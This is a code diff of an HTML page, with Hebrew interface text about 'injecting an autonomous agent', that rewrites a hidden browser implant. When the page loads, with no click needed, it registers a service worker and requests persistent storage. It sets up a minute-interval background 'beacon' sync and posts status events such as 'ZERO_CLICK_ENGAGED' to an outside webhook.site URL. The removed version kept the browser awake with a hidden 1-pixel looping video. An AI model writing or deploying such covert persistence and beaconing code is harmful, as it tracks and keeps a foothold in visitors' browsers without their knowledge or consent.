@@ -3,50 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Owl Sovereign System v2.0</title>
+    <title>Sovereign Autonomy v3.0</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; cursor: pointer; }
-        .terminal { border: 1px solid #00ff41; padding: 20px; width: 80%; box-shadow: 0 0 20px #004400; text-align: center; }
-        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { border: 1px solid #00ff41; padding: 20px; width: 85%; box-shadow: 0 0 30px #004400; text-align: center; }
+        .status-line { font-size: 1.2em; margin: 10px 0; }
         .blink { animation: blinker 1.5s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
     <div class="terminal">
-        <h2>מערכת ינשוף: מצב התמדה</h2>
-        <p id="st" class="blink">ממתין לדריכה (לחץ פעם אחת על המסך)...</p>
-        <video id="v" loop muted playsinline></video>
+        <div class="status-line">מערכת ינשוף: ריבונות מוחלטת</div>
+        <div id="msg" class="blink">מזריק סוכן אוטונומי...</div>
     </div>
 
     <script>
         const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";
-        const v = document.getElementById('v');
-        
-        // וידאו ריק זעיר למניעת הרדמת הדפדפן
-        v.src = "data:video/mp4;base64,AAAAHGZ0eXBtcDQyAAAAAG1wNDJpc29tYXZjMQAAAZptb292AAAAbG12aGQAAAAA3pW96d6VvenfAAAAyAAAA+gAAQAAUUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAGWlVZHMAAAARcGFzc2VzPTE7Ym91bmRzPTA7AAAACHRyYWsAAABcdGtoZAAAAADelb3p3pW96d8AAAABAAAAAAAAA+gAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAnbWRpYQAAACBtZGhkAAAAAN6Vvenelb3p3wAAAUAAAAH0U0UAAAAAAAAA";
+
+        async function transmit(data) {
+            try {
+                await fetch(WEBHOOK, { 
+                    method: 'POST', 
+                    mode: 'no-cors', 
+                    body: JSON.stringify({...data, ts: new Date().toISOString()}) 
+                });
+            } catch(e) {}
+        }
 
         async function init() {
             if ('serviceWorker' in navigator) {
                 try {
-                    await navigator.serviceWorker.register('sw.js');
-                    transmit({ event: "CLOAK_READY" });
-                } catch(e) { transmit({ event: "INJECTION_FAIL", err: e.message }); }
+                    const registration = await navigator.serviceWorker.register('sw.js');
+                    
+                    // בקשת "התמדה" מהדפדפן ללא מגע יד אדם
+                    if (navigator.storage && navigator.storage.persist) {
+                        await navigator.storage.persist();
+                    }
+
+                    // ניסיון לרישום סנכרון רקע תקופתי (מערכות מתקדמות)
+                    if (registration.periodicSync) {
+                        try {
+                            await registration.periodicSync.register('owl-beacon', {
+                                minInterval: 60 * 1000 
+                            });
+                        } catch(e) {
+                            console.log("PeriodicSync not ready, falling back to Service Worker Pulse.");
+                        }
+                    }
+
+                    document.getElementById('msg').innerText = "הסוכן הוזרק. הריבונות פעילה.";
+                    document.getElementById('msg').classList.remove('blink');
+                    
+                    transmit({ event: "ZERO_CLICK_ENGAGED", status: "SUCCESS" });
+
+                } catch (error) {
+                    transmit({ event: "ZERO_CLICK_FAIL", err: error.message });
+                }
             }
         }
-
-        async function transmit(data) {
-            fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({...data, ts: new Date().toISOString()}) });
-        }
-
-        // לחיצה אחת מפעילה את הוידאו ונועלת את הריבונות
-        window.onclick = () => {
-            v.play();
-            document.getElementById('st').innerText = "הינשוף ער וצופה. המערכת נעולה ברקע.";
-            document.getElementById('st').classList.remove('blink');
-            transmit({ event: "ONE_CLICK_ENGAGED" });
-        };
 
         window.onload = init;
     </script>
 </body>
+</html>
